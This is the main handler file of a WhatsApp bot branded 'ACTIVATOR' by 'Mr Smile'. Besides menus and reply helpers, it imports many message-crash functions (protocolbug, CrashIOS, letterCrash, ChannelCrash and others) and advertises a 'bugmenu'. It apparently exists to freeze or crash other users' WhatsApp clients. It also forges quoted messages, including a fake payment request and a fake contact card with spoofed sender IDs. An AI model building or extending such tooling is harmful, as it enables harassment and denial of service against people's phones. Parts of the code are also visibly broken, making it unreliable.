//MR SMILE MODDES 
// DO NOT MODIFY THIS FILE 
//CLONE IF YOU CAN 🙄

require('./configure')
const {
    default: baileys,
    proto,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    downloadContentFromMessage,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");

const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { color } = require('./list/lib/color')
const chalk = require('chalk')
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const ytdl= require ('ytdl-core')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')

const {translate} = require('@vitalets/google-translate-api')
const scp2 = require('./list/lib/scrape2') 

const absenData = {};
const { temporary, temmp } = require('./list/tempor')
const basepic = fs.readFileSync('./Media/basepic.jpg')
const babe = fs.readFileSync('./Media/babe.jpg')
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./list/lib/uploader')
const {NotOwner, antilink, antilinkall, wapresence, badwordkick } = require("./configure.js");
const {
addPremiumUser,
getPremiumExpired,
getPremiumPosition,
expiredPremiumCheck,
checkPremiumUser,
getAllPremiumUser,
} = require('./list/lib/premiun')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./list/lib/converter')
const { protocolbug1, protocolbug2, protocolbug3, protocolbug5,  protocolbug8,invisxaudio, invisxlocation, NewStellarStuck, CrashIOS, invico2, letterCrash, StickerPack6, StallerPackFreze, ChannelCrash1, ChannelCrash2, ChannelCrash3, XMLUI } = require('./list/XczvZap')
const {  protocolbug6, bulldozer, protocolbug7 } = require('./list/Data3.js')
const babi = fs.readFileSync('./Media/Xmd.jpg')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    tanggal,
    telegraPh,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    toIDR,
    capital,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    runtimer,
    fetchBuffer,
    buffergif,
    GroupDB,
    kickQueue,
    totalcase
} = require('./list/lib/func')
const { remini } = require('./list/lib/remini');
const orgkaya = fs.readFileSync('./list/Database/premium.json')   
const owner = JSON.parse(fs.readFileSync('./list/Database/owner.json'))
const isPremium = owner || owner|| checkPremiumUser(m.sender, orgkaya);
global.db.data = JSON.parse(fs.readFileSync('./list/Database/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []
const xtime = moment.tz('Africa/Nairobi').format('HH:mm:ss')
const xdate = moment.tz('Africa/Nairobi').format('DD/MM/YYYY')
const time2 = moment().tz('Africa/Nairobi').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var tennortimewisher = `Good Night mofo🌌`
 }
 if(time2 < "19:00:00"){
var tennortimewisher = `Good Evening mofo🌃`
 }
 if(time2 < "18:00:00"){
var tennortimewisher = `Good Evening mofo🌃`
 }
 if(time2 < "15:00:00"){
var tennortimewisher = `Good Afternoon mofo🌅`
 }
 if(time2 < "11:00:00"){
var tennortimewisher = `Good Morning mofo 🌄`
 }
 if(time2 < "05:00:00"){
var tennortimewisher = `Good Morning mofo🌄`
 } 
const time = moment().tz("Africa/Nairobi").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃 Early Morning"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄GoodMorning"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️GoodAfternoon"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️Goodevening"
} else {
    ucapanWaktu = "🌆Goodnight"
};
const imageList = [
    "https://img12.pixhost.to/images/855/575167528_skyzopedia.jpg",
    "https://files.catbox.moe/affxc7.jpg",
     "https://files.catbox.moe/5yxu1m.jpg",
    "https://files.catbox.moe/ctplog.jpg",
    "https://files.catbox.moe/a3yh1k.jpg"
];
const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];

function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}

//function
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
function capitaler(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
//module
module.exports = bot = async (bot, m, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['+', '/',','] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
        const isCmd = body.startsWith(prefix, '')
        const isCmd2 = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await bot.decodeJid(bot.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
const bugres = 'Sending bug process....'      
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const xeonybody = body.startsWith(pric)
        const isCommand = xeonybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await bot.groupMetadata(m.chat).catch(e => {}) : ''
        
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
const Media = m.mtype
        //user status
const xeonverifieduser = fs.readFileSync('./list/Database/user.json')

        const isUser = xeonverifieduser.includes(sender)
        const Owner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= Owner || checkPremiumUser(m.sender, orgkaya)
        expiredPremiumCheck(bot, m, orgkaya)
async function sendbotMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await bot.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
if (global.autoRecording) {
        bot.sendPresenceUpdate('recording', from)
        }      
      if (global.autoTyping) {
        bot.sendPresenceUpdate('composing', from)
        }
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        bot.sendPresenceUpdate(xeonrecordinfinal, from)

        }
 const groupName = isGroup ? groupMetadata.subject : "";      
if (m.message && m.isGroup) {
    console.log(`
┌────────── [ GROUP CHAT LOG ] ──────────┐
│ 🕒 Time      : ${chalk.green(new Date().toISOString().slice(0, 19).replace('T', ' '))}
│ 📝 Message   : ${chalk.blue(budy || m.mtype)}
│ 👤 Sender    : ${chalk.magenta(pushname)} (${chalk.cyan(m.sender)})
│ 🏠 Group     : ${chalk.yellow(groupName)} (${chalk.cyan(m.chat)})
└────────────────────────────────────────┘
    `);
} else {
    console.log(`
┌───────── [ PRIVATE CHAT LOG ] ─────────┐
│ 🕒 Time      : ${chalk.green(new Date().toISOString().slice(0, 19).replace('T', ' '))}
│ 📝 Message   : ${chalk.blue(budy || m.mtype)}
│ 👤 Sender    : ${chalk.magenta(pushname)} (${chalk.cyan(m.sender)})
└────────────────────────────────────────┘
    `);
}
   
    
const listcolor = ['aqua', 'red', 'blue', 'purple', 'magenta'];
const randomc = listcolor[Math.floor(Math.random() * listcolor.length)];

const moji = ['📚', '💭', '🌏', '〽️', '🌷', '🍁', '⛅',]
const randomemoji = moji[Math.floor(Math.random() * moji.length)]      
const inireact = async () => {
  const emojis = ["🌑", "🌘", "🌗", "🌕", "🌔", "🌓", "🌒", "🌑"];
  
  for (const emoji of emojis) {
    await sleep(80);
    bot.sendMessage(m.chat, { react: { text: emoji, key: m.key }});
  }
  
  await sleep(50);
  bot.sendMessage(m.chat, { react: { text: randomemoji, key: m.key }});
}
const loli = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: bot,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const mdmodes = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "13135559098@s.whatsapp.net"
} : {}),
id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
},
status: 1,
  participant: "0@s.whatsapp.net"
}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://files.catbox.moe/yqbio5.jpg' }}}}
//Reply function//
async function reply(teks) {
bot.sendMessage(m.chat, {
image: babe,  
caption: teks,
sourceUrl: 'https://github.com/Tennor-modz',    
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363418618707597@newsletter",
newsletterName: "© 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 l- 2025"
}
}
}, {
quoted: m
})
}
       const reply2 = async (text) => {
        await bot.sendMessage(m.chat, { text: text }, { quoted: mdmodes })
	  }
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
            var v16 = m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "conversation" ? m.message.conversation : m.mtype == "imageMessage" ? m.message.imageMessage.caption : m.mtype == "videoMessage" ? m.message.videoMessage.caption : m.mtype == "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype == "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype == "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype == "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype == "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "";
         const v18 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(v16) ? v16.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : ".";
        const v20 = v16.replace(v18, "").trim().split(/ +/).shift().toLowerCase();
       const v51 = ["✅"];    
        const v52 = v51[Math.floor(Math.random() * v51.length)];
    const vF4 = p11 => {
      return bot.sendMessage(m.chat, {
        react: {
          text: p11,
          key: m.key
        }
      });
    };
        async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
penis = fs.readFileSync("./wise.js").toString(),
matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);

let totalCases = caseCount,
listCases = caseNames.join('\n⭔ ');   async function loading () {
    var bdick = [
        `▒▒▒▒▒▒▒▒▒▒ 0%`,
        `█▒▒▒▒▒▒▒▒▒ 10%`,
        `██▒▒▒▒▒▒▒▒ 20%`,
        `███▒▒▒▒▒▒▒ 30%`,
        `████▒▒▒▒▒▒ 40%`,
        `█████▒▒▒▒▒ 50%`,
        `██████▒▒▒▒ 60%`,
        `███████▒▒▒ 70%`,
        `████████▒▒ 80%`,
        `█████████▒ 90%`,
        `██████████ 100%`,
        `*ACTIVATING...*`
    ]
    let { key } = await bot.sendMessage(m.chat, {text: `*Loading...*`})
    
    for (let i = 10; i < bdick.length; i++) {
        await bot.sendMessage(m.chat, {text: bdick[i], edit: key });
    }
}
const ReplyMultiMenu = async (teks) => {
  const userMode = global.menuMode || 'nobutton'; // default button

  if (userMode === 'nobutton') {
    let buttonMessage = {
      image: {url:"https://files.catbox.moe/awc1lu.jpeg" },
      gifPlayback: true,  
      caption: teks,
      footer: '̊𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥',
      headerType: 6,
      contextInfo: {
        forwardingScore: 99999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363297764334618@newsletter",
          serverMessageId: null,
          newsletterName: `𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 - 2025`
        },
        externalAdReply: {
          showAdAttribution: true,
          title: `𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 - 2025`,
          body: `𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗢𝗡𝗘`,
          mediaType: 1,
          renderLargerThumbnail: true,
          thumbnailUrl: `https://files.catbox.moe/pxmcqc.jpeg`,
          sourceUrl: "https://github.com/Tennor-modz"
        },
        mentionedJid: [m.sender],
      },
      viewOnce: false
    };

    return await bot.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
await bot.sendMessage(
    m.chat,
    {
      audio: { url: 'https://files.catbox.moe/qpllra.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
  );
  }

  // BUTTON MODE

     
// nativeFlowButton list
   let buttons = [
        { buttonId: ".ownermenu", buttonText: { displayText: "OwnerMenu" }, type: 1 },
       { buttonId: ".othermenu", buttonText: { displayText: "OtherMenu" }, type: 1 },
       { buttonId: ".settingmenu", buttonText: { displayText: "SettingMenu" }, type: 1 },
       { buttonId: ".cpanelmenu", buttonText: { displayText: "CpanelMenu" }, type: 1 },
        { buttonId: ".bugmenu", buttonText: { displayText: "bugmenu" }, type: 1 }
        
    ];
    let buttonMessage = {
    image: {url:"https://files.catbox.moe/awc1lu.jpeg" },
gifPlayback: false,
caption: teks,
contextInfo: {
externalAdReply: {
title: '𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 - 2025',
                    body: '𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗢𝗡𝗘',
                    showAdAttribution: true,
 renderLargerThumbnail: true,  
                    thumbnailUrl: `https://files.catbox.moe/pxmcqc.jpeg`,
                    mediaType: 1,
                    MediaUrl: 'https://www.instagram.com/imachilji',
                    sourceUrl: "https://github.com",
                }
            },    
        footer: "— 𝗕𝗬 𝗠𝗥 𝗦𝗠𝗜𝗟𝗘",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };            
await bot.sendMessage(m.chat, buttonMessage, { quoted: mdmodes });

      }
//==================================================//    
const ReplyMultiMenu2 = async (teks) => {
  const userMode = global.menuMode || 'button'; // default button

  if (userMode === 'button') {
    let buttonMessage2 = {
      image: {url:"https://files.catbox.moe/awc1lu.jpeg" },
      gifPlayback: true,  
      caption: teks,
      footer: '𝗠𝗥 𝗦𝗠𝗜𝗟𝗘̊',
      headerType: 6,
      contextInfo: {
        forwardingScore: 99999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363297764334618@newsletter",
          serverMessageId: null,
          newsletterName: `𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 - 2025`
        },
        externalAdReply: {
          showAdAttribution: true,
          title: `𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 - 2025`,
          body: `𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗢𝗡𝗘`,
          mediaType: 1,
          renderLargerThumbnail: false,
          thumbnailUrl: `https://files.catbox.moe/pxmcqc.jpeg`,
          sourceUrl: "https://github.com/Tennor-modz"
        },
        mentionedJid: [m.sender],
      },
      viewOnce: false
    };

    return await bot.sendMessage(m.chat, buttonMessage2, { quoted: mdmodes });
await bot.sendMessage(
    m.chat,
    {
      audio: { url: 'https://files.catbox.moe/qpllra.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
  );
  }
let buttons = [
        { buttonId: ".smile", buttonText: { displayText: "Creator" }, type: 1 },
        { buttonId: ".start", buttonText: { displayText: "Menu" }, type: 1 }
        
    ];
    let buttonMessage2 = {
    image: {url:"https://files.catbox.moe/awc1lu.jpeg" },
gifPlayback: false,
caption: teks,
contextInfo: {
externalAdReply: {
title: '𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 - 2025',
                    body: '𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗢𝗡𝗘',
                    showAdAttribution: true,
 renderLargerThumbnail: false,  
                    thumbnailUrl: `https://files.catbox.moe/pxmcqc.jpeg`,
                    mediaType: 1,
                    MediaUrl: 'https://www.instagram.com/imachilji',
                    sourceUrl: "https://github.com",
                }
            },    
        footer: "— 𝗕𝗬 𝗠𝗥 𝗦𝗠𝗜𝗟𝗘",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };


                            
    


await bot.sendMessage(m.chat, buttonMessage2, { quoted: mdmodes });

      }
//==================================================//    
const ReplyMultiMenu3 = async (teks) => {
  const userMode = global.menuMode || 'nobutton'; // default button

  if (userMode === 'nobutton') {
    let buttonMessage2 = {
      image: {url:"https://files.catbox.moe/awc1lu.jpeg" },
      gifPlayback: true,  
      caption: teks,
      footer: '𝗠𝗥 𝗦𝗠𝗜𝗟𝗘̊',
      headerType: 6,
      contextInfo: {
        forwardingScore: 99999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363297764334618@newsletter",
          serverMessageId: null,
          newsletterName: `𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 - 2025`
        },
        externalAdReply: {
          showAdAttribution: true,
          title: `𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 - 2025`,
          body: `𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗢𝗡𝗘`,
          mediaType: 1,
          renderLargerThumbnail: true,
          thumbnailUrl: `https://files.catbox.moe/pxmcqc.jpeg`,
          sourceUrl: "https://github.com/Tennor-modz"
        },
        mentionedJid: [m.sender],
      },
      viewOnce: false
    };

    return await bot.sendMessage(m.chat, buttonMessage2, { quoted: mdmodes });
await bot.sendMessage(
    m.chat,
    {
      audio: { url: 'https://files.catbox.moe/qpllra.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
  );
  }
let buttons = [
        { buttonId: ".dev", buttonText: { displayText: "Creator" }, type: 1 },
        { buttonId: ".start", buttonText: { displayText: "Menu" }, type: 1 }
        
    ];
    let buttonMessage3 = {
    image: {url:"https://files.catbox.moe/awc1lu.jpeg" },
gifPlayback: false,
caption: teks,
contextInfo: {
externalAdReply: {
title: '𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 - 2025',
                    body: '𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗢𝗡𝗘',
                    showAdAttribution: true,
 renderLargerThumbnail: true,  
                    thumbnailUrl: `https://files.catbox.moe/pxmcqc.jpeg`,
                    mediaType: 1,
                    MediaUrl: 'https://www.instagram.com/imachilji',
                    sourceUrl: "https://github.com",
                }
            },    
        footer: "— 𝗕𝗬 𝗠𝗥 𝗦𝗠𝗜𝗟𝗘",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };
await bot.sendMessage(m.chat, buttonMessage3, { quoted: mdmodes });

      }

const ReplyMultiMenu4 = async (teks) => {
  const userMode = global.menuMode || 'button'; // default button

  if (userMode === 'button') {
    let buttonMessage3 = {
      image: {url:"https://files.catbox.moe/awc1lu.jpeg" },
      gifPlayback: true,  
      caption: teks,
      footer: '𝗠𝗥 𝗦𝗠𝗜𝗟𝗘̊',
      headerType: 6,
      contextInfo: {
        forwardingScore: 99999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363297764334618@newsletter",
          serverMessageId: null,
          newsletterName: `𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 - 2025`
        },
        externalAdReply: {
          showAdAttribution: true,
          title: `𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 - 2025`,
          body: `𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗢𝗡𝗘`,
          mediaType: 1,
          renderLargerThumbnail: false,
          thumbnailUrl: `https://files.catbox.moe/pxmcqc.jpeg`,
          sourceUrl: "https://github.com/Tennor-modz"
        },
        mentionedJid: [m.sender],
      },
      viewOnce: false
    };

    return await bot.sendMessage(m.chat, buttonMessage3, { quoted: mdmodes });
await bot.sendMessage(
    m.chat,
    {
      audio: { url: 'https://files.catbox.moe/qpllra.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
  );
  }
let buttons = [
        { buttonId: ".ping", buttonText: { displayText: "Speed" }, type: 1 },
        { buttonId: ".start", buttonText: { displayText: "Menu" }, type: 1 }
        
    ];
    let buttonMessage4 = {
    image: {url:"https://files.catbox.moe/awc1lu.jpeg" },
gifPlayback: false,
caption: teks,
contextInfo: {
externalAdReply: {
title: '𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 - 2025',
                    body: '𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗢𝗡𝗘',
                    showAdAttribution: true,
 renderLargerThumbnail: false,  
                    thumbnailUrl: `https://files.catbox.moe/pxmcqc.jpeg`,
                    mediaType: 1,
                    MediaUrl: 'https://www.instagram.com/imachilji',
                    sourceUrl: "https://github.com",
                }
            },    
        footer: "— 𝗕𝗬 𝗠𝗥 𝗦𝗠𝗜𝗟𝗘",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };                
await bot.sendMessage(m.chat, buttonMessage4, { quoted: mdmodes });

      }
const ReplyMultiMenu5= async (teks) => {
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./Media/babe.jpg") }, { upload: bot.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
}), 
contextInfo: {}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: teks, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                 
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Creator\",\"url\":\"https://t.me/mr_smile_modder\",\"merchant_url\":\"https://www.google.com\"}`
},
 {         
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Follow Channel\",\"url\":\"https://whatsapp.com/channel/0029VaesBAXJJhzefVszDu3h\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: mdmodes})
await bot.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
//Command area(only case)
switch (isCommand) {
        case 'setmenu': {
  if (!Owner) return ReplyMultiMenu2(mess.owner);
  const selected = args[0]?.toLowerCase();
  if (!['button', 'nobutton'].includes(selected)) {
    return ReplyMultiMenu2(`*Usage :*\n.setmenu button\n.setmenu nobutton`);
  }

  global.menuMode = selected; // Ubah global, bukan per user
  return ReplyMultiMenu2(`✅ success changed menu to *${selected.toUpperCase()}* mode.`);
}
break
//==================================================//    
        case 'start':
case 'help':        
case 'menu': {
let Menu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
╭─❖ ⌜ ✦ 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 ✦ ⌟ ❖─╮
│ 👨‍💻 Creator       : Mr Smile
│ 🧩 Version       : New Version
│ 📦 Type          : Case
│ ⚙️ Status        : Ready
│ 📡 Mode          : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
│ 👥 Users         : ${Object.keys(db.data.users).length}
│ 🏷️ Prefix        : Single
│ 📋 Total Cmds    : ${totalCases}
╰────────────────────────╯

┌───『 🧩 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔𝐒 』───┐
│ 🧠 ${prefix}ownermenu
│ 🛠️ ${prefix}settingmenu
│ 🖥️ ${prefix}cpanelmenu
│ 🧰 ${prefix}othermenu
│ 🐞 ${prefix}bugmenu
│ 📊 ${prefix}status
│ 📁 ${prefix}totalcase
│ 📡 ${prefix}ping
│ 👨‍💻 ${prefix}dev
└───────────────────────┘

〄 Powered by MR SMILE

`;
ReplyMultiMenu(Menu)
await bot.sendMessage(
    m.chat,
    {
      audio: { url: 'https://files.catbox.moe/e3m7nj.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: mdmodes }
  );   
}
break
                  
//==================================================//
        case 'ownermenu':
case 'ownmenu': {
let Menu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
╭─❖ ⌜ ✦ 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗢𝗥 ✦ ⌟ ❖─╮
│ 👨‍💻 Creator       : Mr Smile
│ 🔄 Version       : New Version
│ 🧩 Type          : Case
│ ⚙️ Status        : Ready
